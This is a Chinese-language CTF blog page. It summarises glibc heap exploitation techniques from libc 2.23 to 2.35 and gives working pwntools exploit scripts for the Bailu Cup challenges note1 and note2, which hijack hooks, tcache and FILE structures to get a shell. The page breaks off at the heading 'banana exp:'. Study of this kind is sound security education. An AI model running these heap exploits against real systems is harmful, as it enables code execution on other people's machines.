<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.0.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"wscyoulin.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.9.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
<meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://wscyoulin.github.io/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="http://wscyoulin.github.io/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"en","comments":"","permalink":"","path":"index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>Hexo</title>
  




  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">Hexo</h1>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>







</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">John Doe</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">21</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
  </nav>
</div>



        </div>
      </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://wscyoulin.github.io/2022/10/02/%E5%A0%86%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/10/02/%E5%A0%86%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">堆利用总结</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2022-10-02 11:12:46 / Modified: 12:16:52" itemprop="dateCreated datePublished" datetime="2022-10-02T11:12:46+08:00">2022-10-02</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="libc-2-23"><a href="#libc-2-23" class="headerlink" title="libc-2.23"></a>libc-2.23</h1><ol>
<li>在libc2.23的版本下最常用的利用方法就是利用fastbin attack打malloc_hook，写onegadget（注意需要找一个\x7f作为chunk的size字段即malloc_hook-0x23，绕过fastbin的检测）</li>
<li>劫持bss段的heap数组，劫持为free_hook，稳定getshell</li>
<li>在relro没完全开启的时候去劫持got表</li>
</ol>
<h1 id="libc-2-27"><a href="#libc-2-27" class="headerlink" title="libc-2.27"></a>libc-2.27</h1><p>2.27最大的变化就是引入了tcache，tcache bin和fastbin的管理方式很像，都采用FILO的单链表（理解为数据结构中的栈），但是tcache的优先级更高，并且在bin中，fastbin的fd指针指向上一个chunk的头部，而tcache会指向上一个chunk的数据部分。旧版libc2.27中，tcache结构体没有引入key指针，可以随意double free，基本上是指哪儿打哪儿，在UAF下，使得利用手法更为容易，并且在分配的过程中没有对size进行检查。</p>
<p>1.首先泄露libc基址时，可以填满7个0xa0的tcache，然后利用uaf泄露出unsorted bin的fd指针从而泄露出libc基址</p>
<p>2.如果对堆块大小申请没有限制也可以直接申请一个0x420的堆块释放成为largebin，也可以直接通过泄露出largebin 的fd指针来泄露出libc基址</p>
<p>tcache利用：因为tcache的fd指针是指向的userdata，不像fastbin的fd指针一样指向堆块的头部，所以可以直接通过double free形成的指哪打哪的效果，修改free_hook为system_addr，然后释放一个里面写了’/bin/sh\x00‘的堆块来获得shell</p>
<h1 id="libc-2-31"><a href="#libc-2-31" class="headerlink" title="libc-2.31"></a>libc-2.31</h1><p>新版libc2.27和2.31类似，引入了新的内容key，如果key值等于tcache的地址，那么就进入tcache的链表，然后后移，判断当前堆块是否在链表中，如果在链表中，那么很显然就是double free了。绕过方法很简单，利用漏洞改掉key值即可，直接给干掉if判断了，就不会进入这个if分支了。 在UAF下的利用手法为首先填满tcache，然后申请unsorted bin大小的chunk，利用UAF泄露libc基址，最后通过修改tcache的指针轻松的将堆块申请到__free_hook，修改为system地址，然后free一个chunk，chunk的内容为”/bin/shx00”即可轻松getshell。</p>
<h1 id="libc-2-32"><a href="#libc-2-32" class="headerlink" title="libc-2.32"></a>libc-2.32</h1><p>2.32引入了一个宏<code>PROTECT_PTR，加入了一个safelink机制</code>,检测了申请地址是否以0x10对齐,fastbin attack的利用方法受到限制,例如经典的错位构造’\x7f’，劫持malloc_hook,和IO_FILE的利用方法（基本上都开始采用tcache来任意申请堆块了）</p>
<p>并且在这个版本开始，还增加了一个堆tcache 的fd指针进行异或的加密,在UAF的场景下，我们可以直接用show即可泄露出e-&gt;next值，因为最初tcache链表是为空的，也就是说safe-linking机制只相当于用堆地址右移了12位，通过左移即可恢复出堆地址，从而泄露出堆的基址，泄露出堆地址以后就可以来伪造tcache的next位了，将想改写的地址和key异或一下就可以直接修改tcache的fd指针了，一样可以将tcache指向free_hook来获得shell</p>
<h1 id="libc-2-34（已经逐渐淘汰）"><a href="#libc-2-34（已经逐渐淘汰）" class="headerlink" title="libc-2.34（已经逐渐淘汰）"></a>libc-2.34（已经逐渐淘汰）</h1><p>移除了几个hook符号：</p>
<p>__free_hook</p>
<p>__malloc_hook</p>
<p>__realloc_hook</p>
<p>__memalign_hook</p>
<p>__after_morecore_hook</p>
<p>获得shell的几个方法：</p>
<p>1.泄露完libc之后，通过计算偏移来泄露出environ指针的内容，来泄露出栈的地址，在栈上写rop链</p>
<p>2.劫持exit_hook（注意2.34-0ubuntu3.2之后exit_hook也不行了）</p>
<h1 id="libc-2-35"><a href="#libc-2-35" class="headerlink" title="libc-2.35"></a>libc-2.35</h1><p>相关的虚表已经不可以写了</p>
<p>平常最常用的攻击手法就是house of banana,house of apple</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://wscyoulin.github.io/2022/09/22/%E6%9F%8F%E9%B9%AD%E6%9D%AF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/09/22/%E6%9F%8F%E9%B9%AD%E6%9D%AF/" class="post-title-link" itemprop="url">柏鹭杯</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-09-22 20:50:25" itemprop="dateCreated datePublished" datetime="2022-09-22T20:50:25+08:00">2022-09-22</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2022-09-23 22:29:02" itemprop="dateModified" datetime="2022-09-23T22:29:02+08:00">2022-09-23</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="柏鹭杯复现"><a href="#柏鹭杯复现" class="headerlink" title="柏鹭杯复现"></a>柏鹭杯复现</h1><h2 id="note1"><a href="#note1" class="headerlink" title="note1"></a>note1</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">banary = &quot;./note1&quot;</span><br><span class="line">elf = ELF(banary)</span><br><span class="line">libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="line">#libc=ELF(&quot;/home/youlin/tools/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc-2.31.so&quot;)</span><br><span class="line">ip = &#x27;1.14.71.254&#x27;</span><br><span class="line">port = 28581</span><br><span class="line">local = 1</span><br><span class="line">if local:</span><br><span class="line">    io = process(banary)</span><br><span class="line">else:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)</span><br><span class="line">#context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;)</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sa = lambda text, data : io.sendafter(text, data)</span><br><span class="line">sla = lambda text, data : io.sendlineafter(text, data)</span><br><span class="line">r = lambda : io.recv()</span><br><span class="line">ru = lambda text : io.recvuntil(text)</span><br><span class="line">uu32 = lambda : u32(io.recvuntil(b&quot;\xff&quot;)[-4:].ljust(4, b&#x27;\x00&#x27;))</span><br><span class="line">uu64 = lambda : u64(io.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8, b&quot;\x00&quot;))</span><br><span class="line">iuu32 = lambda : int(io.recv(10),16)</span><br><span class="line">iuu64 = lambda : int(io.recv(12),16)</span><br><span class="line">lg = lambda addr : log.info(addr)</span><br><span class="line">ia = lambda : io.interactive()</span><br><span class="line"></span><br><span class="line">def add(index,size,name,tag,func = 2):</span><br><span class="line">    sla(&quot;&gt; &quot;,b&#x27;1&#x27;)</span><br><span class="line">    sla(&quot;id: &quot;,str(index))</span><br><span class="line">    sla(&quot;name_length: &quot;,str(size))</span><br><span class="line">    sla(&quot;name: &quot;,name)</span><br><span class="line">    sla(&quot;tag: &quot;,tag)</span><br><span class="line">    sla(&quot;func: &quot;,str(func))</span><br><span class="line"></span><br><span class="line">def edit_name(idx,size,name):</span><br><span class="line">    sla(&quot;&gt; &quot;,b&#x27;2&#x27;)</span><br><span class="line">    sla(&quot;id: &quot;,str(idx))</span><br><span class="line">    sla(&quot;&gt; &quot;,b&#x27;1&#x27;)</span><br><span class="line">    sla(&quot;name_length: &quot;,str(size))</span><br><span class="line">    io.sendlineafter(&quot;name: &quot;,name)</span><br><span class="line"></span><br><span class="line">def edit_tag(idx,tag):</span><br><span class="line">    sla(&quot;&gt; &quot;,b&#x27;2&#x27;)</span><br><span class="line">    sla(&quot;id: &quot;,str(idx))</span><br><span class="line">    sla(&quot;&gt; &quot;,b&#x27;2&#x27;)</span><br><span class="line">    io.sendafter(&quot;new tag: &quot;,tag)</span><br><span class="line"></span><br><span class="line">def edit_func(idx,func):</span><br><span class="line">    sla(&quot;&gt; &quot;,b&#x27;2&#x27;)</span><br><span class="line">    sla(&quot;id: &quot;,str(idx))</span><br><span class="line">    sla(&quot;&gt; &quot;,b&#x27;3&#x27;)</span><br><span class="line">    sla(&quot;func: &quot;,str(func))</span><br><span class="line"></span><br><span class="line">def call(idx):</span><br><span class="line">    sla(&quot;&gt; &quot;,b&#x27;3&#x27;)</span><br><span class="line">    sla(&quot;id: &quot;,str(idx))</span><br><span class="line"></span><br><span class="line">add(0,0x420,b&#x27;A&#x27;*0x420,b&#x27;&#x27;)</span><br><span class="line">edit_tag(0, p64(0xdeadbeefdeadbeef))</span><br><span class="line">edit_func(0, 1)</span><br><span class="line">call(0)</span><br><span class="line"></span><br><span class="line">ru(b&#x27;\xef\xbe\xad\xde\xef\xbe\xad\xde&#x27;)</span><br><span class="line">base=u64(io.recv(6).ljust(8, b&#x27;\x00&#x27;))-0x131b</span><br><span class="line">print(&quot;base:&quot;+hex(base))</span><br><span class="line"></span><br><span class="line">edit_name(0,0x10,b&#x27;youlin&#x27;)</span><br><span class="line">add(1,0x10,b&#x27;youlin&#x27;,b&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">edit_name(0,0x41f,p64(0)*3+p64(0x31)+p64(0)+p64(base+0x131b)+p64(base+elf.got[&#x27;puts&#x27;])+p64(0x421))</span><br><span class="line"></span><br><span class="line">call(1)</span><br><span class="line">libcbase = uu64() - libc.sym[&#x27;puts&#x27;]</span><br><span class="line">print(&quot;libcbase:&quot;+hex(libcbase))</span><br><span class="line">system=libcbase+libc.sym[&#x27;system&#x27;]</span><br><span class="line">bin_sh=libcbase+next(libc.search(b&#x27;/bin/sh&#x27;))</span><br><span class="line"></span><br><span class="line">edit_name(0,0x41f,p64(0)*3+p64(0x31)+b&#x27;/bin/sh&#x27;.ljust(0x8,b&#x27;\x00&#x27;)+p64(system))</span><br><span class="line">call(1)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

<h2 id="note2"><a href="#note2" class="headerlink" title="note2"></a>note2</h2><p>比较简单的一道题，直接给了uaf，因为一开始用house of banana在本机一直打不通，刚好又看到pursue师傅的博客用的house of apple，刚好了解下house of apple</p>
<p>house of apple具体原理：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/549114257">https://zhuanlan.zhihu.com/p/549114257</a></p>
<p>先将_IO_list_all修改为堆上伪造io的地址，然后利用模板</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">fake_file1 = b&#x27;\x00&#x27; * (0x10)</span><br><span class="line">fake_file1 += p64(0)    # fp -&gt; _IO_write_base</span><br><span class="line">fake_file1 += p64(1)    # fp -&gt; _IO_write_ptr</span><br><span class="line">fake_file1 += p64(0)    # fp -&gt; _IO_write_end</span><br><span class="line">fake_file1 = fake_file1.ljust(0x78, b&#x27;\x00&#x27;)</span><br><span class="line">fake_file1 += p64(heapbase)     # _lock</span><br><span class="line">fake_file1 = fake_file1.ljust(0x90, b&#x27;\x00&#x27;)</span><br><span class="line">fake_file1 += p64(heapbase + 0xf00 + 0x100)    # _wide_data</span><br><span class="line">fake_file1 = fake_file1.ljust(0xc8, b&#x27;\x00&#x27;)</span><br><span class="line">fake_file1 += p64(io_wfile_jumps)      # vtable</span><br><span class="line">fake_file1 = fake_file1.ljust(0x100 - 0x10, b&#x27;\x00&#x27;)</span><br><span class="line"></span><br><span class="line">fake_wide = b&#x27;\x00&#x27; * 0x68</span><br><span class="line">fake_wide += p64(ogg)     # _wide_vtable + 0x68</span><br><span class="line"># fake_wide = fake_wide.ljust(0xa0, b&#x27;\x00&#x27;)</span><br><span class="line"># fake_wide += p64(heap_base + 0x1c90)    # rsp -&gt; orw_addr</span><br><span class="line"># fake_wide += p64(p_rdi_r + 1)       # rip -&gt; ret</span><br><span class="line">fake_wide = fake_wide.ljust(0xe0, b&#x27;\x00&#x27;)</span><br><span class="line">fake_wide += p64(heapbase + 0xf00 + 0x100)     # _wide_vtable</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">banary = &quot;./note2&quot;</span><br><span class="line">elf = ELF(banary)</span><br><span class="line">#libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="line">libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line">ip = &#x27;1.14.71.254&#x27;</span><br><span class="line">port = 28581</span><br><span class="line">local = 1</span><br><span class="line">if local:</span><br><span class="line">    io = process(banary)</span><br><span class="line">else:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)</span><br><span class="line">#context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;)</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sa = lambda text, data : io.sendafter(text, data)</span><br><span class="line">sla = lambda text, data : io.sendlineafter(text, data)</span><br><span class="line">r = lambda : io.recv()</span><br><span class="line">ru = lambda text : io.recvuntil(text)</span><br><span class="line">uu32 = lambda : u32(io.recvuntil(b&quot;\xff&quot;)[-4:].ljust(4, b&#x27;\x00&#x27;))</span><br><span class="line">uu64 = lambda : u64(io.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8, b&quot;\x00&quot;))</span><br><span class="line">iuu32 = lambda : int(io.recv(10),16)</span><br><span class="line">iuu64 = lambda : int(io.recv(12),16)</span><br><span class="line">lg = lambda addr : log.info(addr)</span><br><span class="line">ia = lambda : io.interactive()</span><br><span class="line"></span><br><span class="line">def add(idx, size, content):</span><br><span class="line">    sla(&#x27;------------&#x27;, b&#x27;1&#x27;)</span><br><span class="line">    sla(&#x27;Index?&#x27;, str(idx))</span><br><span class="line">    sla(&#x27;Size?&#x27;, str(size))</span><br><span class="line">    sla(&#x27;Enter content: &#x27;, content)</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">    sla(&#x27;------------&#x27;, b&#x27;2&#x27;)</span><br><span class="line">    sla(&#x27;Index?&#x27;, str(idx))</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">    sla(&#x27;------------&#x27;, b&#x27;3&#x27;)</span><br><span class="line">    sla(&#x27;Index?&#x27;, str(idx))</span><br><span class="line"></span><br><span class="line">def leave():</span><br><span class="line">    sla(&#x27;------------&#x27;, b&#x27;4&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(8):</span><br><span class="line">    add(i,0x108,b&#x27;youlin&#x27;)</span><br><span class="line"></span><br><span class="line">delete(1)</span><br><span class="line">show(1)</span><br><span class="line">r()</span><br><span class="line">key=u64(io.recv(5).ljust(8, b&#x27;\x00&#x27;))</span><br><span class="line">heapbase=key&lt;&lt;12</span><br><span class="line">print(&quot;heapbase:&quot;+hex(heapbase))</span><br><span class="line"></span><br><span class="line">for i in range(2,8):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">show(0)</span><br><span class="line">libcbase=uu64()-0x219ce0</span><br><span class="line">print(&quot;libcbase:&quot;+hex(libcbase))</span><br><span class="line">pop_rdi=libcbase+0x000000000002a3e5</span><br><span class="line">system=libcbase+libc.sym[&#x27;system&#x27;]</span><br><span class="line">bin_sh=libcbase+next(libc.search(b&#x27;/bin/sh&#x27;))</span><br><span class="line">io_list_all = libcbase + libc.sym[&#x27;_IO_list_all&#x27;]</span><br><span class="line">io_wfile_jumps = libcbase + libc.sym[&#x27;_IO_wfile_jumps&#x27;]</span><br><span class="line">ogg = libcbase + 0xebcf5</span><br><span class="line"></span><br><span class="line">for i in range(8):</span><br><span class="line">    add(i, 0x108, b&#x27;youlin&#x27;)</span><br><span class="line">for i in range(9):</span><br><span class="line">    add(i, 0x68, b&#x27;youlin&#x27;)</span><br><span class="line">for i in range(9):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">delete(7)</span><br><span class="line">for i in range(7):</span><br><span class="line">    add(i, 0x68, b&#x27;youlin&#x27;)</span><br><span class="line"></span><br><span class="line">add(0, 0x68, p64(key ^ io_list_all))</span><br><span class="line">add(1, 0x68, b&#x27;youlin&#x27;)</span><br><span class="line">add(2, 0x68, b&#x27;youlin&#x27;)</span><br><span class="line">add(3, 0x68, p64(heapbase + 0xf00))</span><br><span class="line"></span><br><span class="line">fake_file1 = b&#x27;\x00&#x27; * (0x10)</span><br><span class="line">fake_file1 += p64(0)    # fp -&gt; _IO_write_base</span><br><span class="line">fake_file1 += p64(1)    # fp -&gt; _IO_write_ptr</span><br><span class="line">fake_file1 += p64(0)    # fp -&gt; _IO_write_end</span><br><span class="line">fake_file1 = fake_file1.ljust(0x78, b&#x27;\x00&#x27;)</span><br><span class="line">fake_file1 += p64(heapbase)     # _lock</span><br><span class="line">fake_file1 = fake_file1.ljust(0x90, b&#x27;\x00&#x27;)</span><br><span class="line">fake_file1 += p64(heapbase + 0xf00 + 0x100)    # _wide_data</span><br><span class="line">fake_file1 = fake_file1.ljust(0xc8, b&#x27;\x00&#x27;)</span><br><span class="line">fake_file1 += p64(io_wfile_jumps)      # vtable</span><br><span class="line">fake_file1 = fake_file1.ljust(0x100 - 0x10, b&#x27;\x00&#x27;)</span><br><span class="line"></span><br><span class="line">fake_wide = b&#x27;\x00&#x27; * 0x68</span><br><span class="line">fake_wide += p64(ogg)     # _wide_vtable + 0x68</span><br><span class="line"># fake_wide = fake_wide.ljust(0xa0, b&#x27;\x00&#x27;)</span><br><span class="line"># fake_wide += p64(heap_base + 0x1c90)    # rsp -&gt; orw_addr</span><br><span class="line"># fake_wide += p64(p_rdi_r + 1)       # rip -&gt; ret</span><br><span class="line">fake_wide = fake_wide.ljust(0xe0, b&#x27;\x00&#x27;)</span><br><span class="line">fake_wide += p64(heapbase + 0xf00 + 0x100)     # _wide_vtable</span><br><span class="line"></span><br><span class="line">fake_file1 += fake_wide</span><br><span class="line"></span><br><span class="line">add(4, 0x200, fake_file1)</span><br><span class="line">leave()</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>



<p>经过不断的调试和pursue师傅的教学，发现是因为我本机的Ubuntu22.04和远程的环境不太一样（明明glibc版本都是Ubuntu GLIBC 2.35-0ubuntu3.1）具体原因不太清楚了，最后发现是_rtld_global和l_next两个需要伪造和修改的地址不一样</p>
<p>banana exp:</p>
